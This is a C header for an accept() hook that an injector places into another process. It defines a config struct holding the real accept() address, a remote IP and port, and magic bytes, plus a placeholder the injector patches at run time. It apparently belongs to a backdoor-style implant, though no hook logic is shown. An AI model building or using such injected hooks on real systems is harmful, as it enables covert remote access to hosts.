#ifndef HOOK_ACCEPT_HOOK_H
#define HOOK_ACCEPT_HOOK_H

#include <stdint.h>
#include <stddef.h>

/*
 * Config struct written by the injector at page + HOOK_CONFIG_OFFSET.
 * The hook code reaches it via a patched pointer placeholder.
 */
#define HOOK_CONFIG_OFFSET  0x400

struct hook_config {
    uint64_t  real_accept;   /* +0x00  patched: original accept() address    */
    uint32_t  remote_ip;     /* +0x08  network byte order (from inet_addr)    */
    uint16_t  remote_port;   /* +0x0C  network byte order (from htons)        */
    uint8_t   _pad[2];       /* +0x0E                                         */
    uint8_t   magic[4];      /* +0x10  {0xDE,0xAD,0xBE,0xEF}                 */
};

/*
 * Single placeholder burned into hook machine code.
 * The injector scans for it and replaces it with page + HOOK_CONFIG_OFFSET.
 */
#if defined(__x86_64__) || defined(__aarch64__)
#  define HOOK_CONFIG_MAGIC  UINT64_C(0xDEADBEEFCAFEBABE)
#elif defined(__arm__) || defined(__i386__)
#  define HOOK_CONFIG_MAGIC  UINT32_C(0xDEADBEEF)
#endif

void hook_accept(void);
void hook_accept_end(void);

static inline size_t hook_accept_size(void)
{
    return (size_t)((uint8_t *)hook_accept_end - (uint8_t *)hook_accept);
}

#endif
